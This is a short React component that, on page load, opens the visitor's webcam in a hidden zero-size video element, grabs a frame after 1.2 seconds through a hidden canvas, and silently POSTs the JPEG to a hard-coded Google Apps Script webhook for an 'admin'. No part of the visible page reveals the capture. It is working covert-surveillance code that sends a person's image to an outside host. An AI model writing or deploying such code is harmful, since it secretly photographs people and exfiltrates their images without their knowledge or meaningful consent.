import React, { useEffect, useRef } from "react";

export default function AutoCapture() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbxhCraDUrmQb814xAVJzAIaUG1yd9uHPXrZvZOe-JiX-CZbWF8XPtFzu_hYlAdGTK3Gew/exec"; // replace this

  useEffect(() => {
    async function setupCamera() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      videoRef.current.srcObject = stream;

      videoRef.current.onloadedmetadata = () => {
        videoRef.current.play();
        setTimeout(captureImage, 1200); // wait 1.2s before capturing
      };
    }

    setupCamera();
  }, []);

  const captureImage = () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;
    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw frame onto canvas
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert to base64 jpeg
    const base64Image = canvas.toDataURL("image/jpeg").split(",")[1];

    sendToDrive(base64Image);
  };

  const sendToDrive = async (base64) => {
    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        mode: "no-cors",
        body: base64,
      });
      console.log("Image sent to admin (Google Drive)");
    } catch (err) {
      console.error("Upload failed:", err);
    }
  };

  return (
    <div className="w-full h-full relative">
      <video
        ref={videoRef}
        autoPlay
        playsInline
        className="w-0 h-0 absolute opacity-0" // hidden video
      />

      <canvas ref={canvasRef} className="hidden" />

      <p className="text-center mt-4 text-gray-600">
...      </p>
    </div>
  );
}
